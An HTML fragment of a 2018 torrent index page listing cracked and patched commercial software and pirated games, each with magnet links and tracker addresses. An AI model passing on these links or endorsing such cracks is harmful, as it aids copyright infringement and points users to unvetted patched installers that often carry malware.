<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="18/03/2018 22:06:23">6 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>367.37 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>26</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>5</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/disk-drill-pro-2-0-0-323-patch-t273456.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/disk-drill-pro-2-0-0-323-patch-t273456.html" "><b>Disk Drill Pro 2.0.0.323 + Patch</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:9F9C4DF30489BEE0DCB8B81A2C89F26181DE6054&dn=Disk Drill Pro 2.0.0.323 + Patch&xl=13222208&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://tracker.uw0.xyz:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/disk-drill-pro-2-0-0-323-patch-t273456/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 14:59:45">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>12.61 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>3</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>1</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/imazing-v-2-3-5-patch-t273457.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/imazing-v-2-3-5-patch-t273457.html" "><b>iMazing v.2.3.5 + Patch</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:D4E361CD3E026EA894923465C8E9C59AAE6200DC&dn=iMazing v.2.3.5 + Patch&xl=92710866&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce &tr= http://public.popcorn-tracker.org:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/imazing-v-2-3-5-patch-t273457/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 15:01:11">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>88.42 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/turbocollage-v-7-0-2-0-cracked-t273573.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/turbocollage-v-7-0-2-0-cracked-t273573.html" "><b>TurboCollage v.7.0.2.0 Cracked</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:4CDBF4E55B65E930717EDDE9ED284FAC12F455B0&dn=TurboCollage v.7.0.2.0 Cracked&xl=6526226&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/turbocollage-v-7-0-2-0-cracked-t273573/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 15:51:36">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>6.22 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>1</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/wondershare-pdfelement-6-pro-2990-patch-t273585.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/wondershare-pdfelement-6-pro-2990-patch-t273585.html" "><b>Wondershare PDFElement 6 Pro 2990 + Patch</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:51444C46C0D8A3CFAC1F6A8D4ECA26C253ADC993&dn=Wondershare PDFElement  6 Pro 2990 + Patch&xl=74253485&tr= http://tracker.vanitycore.co:6969/announce &tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce &tr= http://public.popcorn-tracker.org:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/wondershare-pdfelement-6-pro-2990-patch-t273585/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 15:54:57">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>70.81 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/macphun-luminar-2018-patch-t273593.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/macphun-luminar-2018-patch-t273593.html" "><b>Macphun Luminar 2018 + Patch</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:29EDA61B0D093B85FF95CAB80568DFC896B67FFA&dn=Macphun  Luminar 2018 + Patch&xl=285292941&tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://tracker.vanitycore.co:6969/announce &tr= udp://tracker.pirateparty.gr:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/macphun-luminar-2018-patch-t273593/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 16:05:42">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>272.08 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/wondershare-video-converter-ultimate-10-2-3-crack-t273572.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/wondershare-video-converter-ultimate-10-2-3-crack-t273572.html" "><b>Wondershare Video Converter Ultimate 10.2.3 + Crack</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:7413088876E692FDBEA0C6BACFAA029F3ED11C7A&dn=Wondershare Video Converter Ultimate 10.2.3 + Crack&xl=119401398&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce &tr= http://public.popcorn-tracker.org:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/wondershare-video-converter-ultimate-10-2-3-crack-t273572/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 15:49:05">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>113.87 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>5</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/my-screen-recorder-pro-v-5-11-patch-t273591.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/my-screen-recorder-pro-v-5-11-patch-t273591.html" "><b>My Screen Recorder Pro v.5.11 + Patch</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:4B4C5E31399EB5BDECBE53F769DD71978EA964A7&dn=My Screen Recorder Pro v.5.11 + Patch&xl=42472964&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://tracker.vanitycore.co:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/my-screen-recorder-pro-v-5-11-patch-t273591/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 16:00:06">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>40.51 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/macphun-aurora-hdr-2018-patch-t273597.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/macphun-aurora-hdr-2018-patch-t273597.html" "><b>Macphun Aurora HDR 2018 + Patch</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:3C15E10DC795A6C9054C963893BE33782ACC2C09&dn=Macphun  Aurora HDR 2018 + Patch&xl=258027717&tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://tracker.vanitycore.co:6969/announce &tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/macphun-aurora-hdr-2018-patch-t273597/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 16:09:47">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>246.07 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/video-thumbnails-maker-platinum-v11-0-0-0-cracked-t273590.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/video-thumbnails-maker-platinum-v11-0-0-0-cracked-t273590.html" "><b>Video Thumbnails Maker Platinum v11.0.0.0 Cracked</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:320EEE866877DDE1700E74F812BE5AFCB439288D&dn=Video Thumbnails Maker Platinum v11.0.0.0 Cracked&xl=26928336&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://tracker.vanitycore.co:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/video-thumbnails-maker-platinum-v11-0-0-0-cracked-t273590/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 15:57:45">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>25.68 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/iobit-uninstaller-7-pro-v-7-3-0-patch-t274065.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/iobit-uninstaller-7-pro-v-7-3-0-patch-t274065.html" "><b>IObit Uninstaller 7 PRO V 7.3.0 + Patch</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:A08E2B402FFC350FDC2494173BE98215F5DE00DE&dn=IObit Uninstaller 7 PRO V 7.3.0 + Patch&xl=18351250&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/iobit-uninstaller-7-pro-v-7-3-0-patch-t274065/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="21/03/2018 17:07:28">3 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>17.50 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat200 icon16" href="/iexplorer-v-4-1-14-patch-t274064.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/iexplorer-v-4-1-14-patch-t274064.html" "><b>iExplorer v.4.1.14 + Patch</b></a> <small><i>by <a href='/perfil/sipatunayu/'>sipatunayu</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="imagnet icon16" href="magnet:?xt=urn:btih:E9FE5FDA8AF08443FAEFEAB206DE9B107527FAC7&dn=iExplorer v.4.1.14 + Patch&xl=2397417&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/iexplorer-v-4-1-14-patch-t274064/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="21/03/2018 17:02:08">3 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>2.29 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
</table>
</td></tr></table><br /><br /><br /><table class="main" width=100% border=0 cellspacing=0 cellpadding=0><tr><td class="embedded"><h2><a href="/top/jogos/">GAMES</a></h2>
<table class="torrenttable" width="100%">
<tr style="background-color: transparent;">
<td class="colhead" align="left">TORRENT</td>
<td class="colhead" align="left">&nbsp;</td>
<td class="colhead" align="center">UPLOADED</td><td class="colhead" align="center">SIZE</td><td class="colhead" align="right">SEEDS</td>
<td class="colhead" align="right">LEECHS</td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/spider-man-web-of-shadows-xbox360-jtag-rgh-soparagamestorrents-com-t273684.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/spider-man-web-of-shadows-xbox360-jtag-rgh-soparagamestorrents-com-t273684.html" "><b>SPIDER-MAN WEB OF SHADOWS (XBOX360) JTAG-RGH soparagamestorrents.com</b></a> <small><i>by <a href='/perfil/ricmessi/'>ricmessi</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/spider-man-web-of-shadows-xbox360-jtag-rgh-soparagamestorrents-com-t273684.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:F6947111762614F83B388F26A76394EA62521A5D&dn=SPIDER-MAN WEB OF SHADOWS (XBOX360) JTAG-RGH soparagamestorrents.com&xl=5233473087&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://opentrackr.org:1337/announce &tr= http://tracker.opentrackr.org:1337/announce &tr= http://bt.xxx-tracker.com:2710/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/spider-man-web-of-shadows-xbox360-jtag-rgh-soparagamestorrents-com-t273684/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 22:08:10">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>4.87 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>4</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/naruto-the-broken-bond-xbox360-jtag-rgh-soparagamestorrents-com-t275170.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/naruto-the-broken-bond-xbox360-jtag-rgh-soparagamestorrents-com-t275170.html" "><b>NARUTO THE BROKEN BOND (XBOX360) JTAG-RGH soparagamestorrents.com</b></a> <small><i>by <a href='/perfil/ricmessi/'>ricmessi</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/naruto-the-broken-bond-xbox360-jtag-rgh-soparagamestorrents-com-t275170.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:18B3C60615148540F9143C8A944A2E76E83C7AD0&dn=NARUTO THE BROKEN BOND (XBOX360) JTAG-RGH soparagamestorrents.com&xl=3173369785&tr= udp://tracker.pirateparty.gr:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/naruto-the-broken-bond-xbox360-jtag-rgh-soparagamestorrents-com-t275170/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="23/03/2018 16:52:38">1 day</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>2.96 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/naruto-rise-of-a-ninja-xbox360-jtag-rgh-soparagamestorrents-com-t275926.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/naruto-rise-of-a-ninja-xbox360-jtag-rgh-soparagamestorrents-com-t275926.html" "><b>NARUTO RISE OF A NINJA (XBOX360) JTAG-RGH soparagamestorrents.com</b></a> <small><i>by <a href='/perfil/ricmessi/'>ricmessi</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/naruto-rise-of-a-ninja-xbox360-jtag-rgh-soparagamestorrents-com-t275926.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:BEEDAC0EFDDE8308B398A63E12C4C724C62AA17F&dn=NARUTO RISE OF A NINJA (XBOX360) JTAG-RGH soparagamestorrents.com&xl=4434089035&tr= udp://tracker.pirateparty.gr:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/naruto-rise-of-a-ninja-xbox360-jtag-rgh-soparagamestorrents-com-t275926/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="24/03/2018 16:00:21">6 hours</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>4.13 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>0</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/surviving-mars-codex-t272104.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/surviving-mars-codex-t272104.html" "><b>Surviving Mars-CODEX</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/surviving-mars-codex-t272104.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:1F2070386FA410EAD4004E065F69EE1456375B06&dn=Surviving Mars-CODEX&xl=4802811822&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://eddie4.nl:6969&tr=udp://9.rarbg.to:2710&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://public.popcorn-tracker.org:6969&tr=http://tracker.mg64.net:6881/announce&tr=udp://mgtracker.org:6969&tr=http://mgtracker.org:2710/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://asnet.pw:2710/announce&tr=http://open.acgtracker.com:1096/announce&tr=http://tracker1.itzmx.com:8080/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/surviving-mars-codex-t272104/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 10:09:55">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>4.47 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>608</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>58</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/gears-of-war-4-codex-t272200.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/gears-of-war-4-codex-t272200.html" "><b>Gears of War 4-CODEX</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/gears-of-war-4-codex-t272200.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:DCDB3DC3EFC363800A78B810535DA4644B12D1A9&dn=Gears of War 4-CODEX&xl=119147698320&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://eddie4.nl:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://p4p.arenabg.com:1337&tr=udp://9.rarbg.to:2710&tr=udp://tracker.opentrackr.org:1337&tr=udp://public.popcorn-tracker.org:6969&tr=udp://p4p.arenabg.ch:1337&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://open.acgtracker.com:1096/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=udp://mgtracker.org:6969&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/gears-of-war-4-codex-t272200/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 11:34:01">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>110.96 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>32</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>176</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/game-dev-studio-t271723.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/game-dev-studio-t271723.html" "><b>Game Dev Studio</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/game-dev-studio-t271723.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:25193AB15B732C6D1527065EA928C385E5FE7D74&dn=Game Dev Studio&xl=56712494&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://eddie4.nl:6969&tr=udp://p4p.arenabg.com:1337&tr=udp://9.rarbg.to:2710&tr=udp://tracker.opentrackr.org:1337&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://public.popcorn-tracker.org:6969&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=udp://asnet.pw:2710/announce&tr=udp://mgtracker.org:6969" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/game-dev-studio-t271723/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 00:23:37">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>54.09 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>85</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>3</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/warhammer-vermintide-2-t272096.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/warhammer-vermintide-2-t272096.html" "><b>Warhammer: Vermintide 2</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/warhammer-vermintide-2-t272096.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:1E1BBFA1AA35B7CCEADDBB595F697A82F662523C&dn=Warhammer: Vermintide 2&xl=35981241750&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://eddie4.nl:6969&tr=udp://p4p.arenabg.com:1337&tr=udp://9.rarbg.to:2710&tr=udp://public.popcorn-tracker.org:6969&tr=http://mgtracker.org:2710/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://open.acgtracker.com:1096/announce&tr=http://tracker.files.fm:6969/announce&tr=http://tracker.mg64.net:6881/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=udp://asnet.pw:2710/announce&tr=udp://mgtracker.org:6969" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/warhammer-vermintide-2-t272096/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 10:09:11">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>33.51 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>132</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>106</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat400 icon16" href="/farm-together-update-6-t271725.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/farm-together-update-6-t271725.html" "><b>Farm Together Update 6</b></a> <small><i>by <a href='/perfil/dauphong/'>dauphong</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/farm-together-update-6-t271725.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:4574FF98C02C21F3FA64B4E9EB0E4E1CF912E547&dn=Farm Together Update 6&xl=310654914&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://9.rarbg.to:2710&tr=udp://eddie4.nl:6969&tr=udp://p4p.arenabg.com:1337&tr=udp://tracker.opentrackr.org:1337&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://public.popcorn-tracker.org:6969&tr=udp://mgtracker.org:6969&tr=http://tracker.mg64.net:6881/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://mgtracker.org:2710/announce&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/farm-together-update-6-t271725/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="19/03/2018 00:23:54">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>296.26 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>67</font></a></b></td>
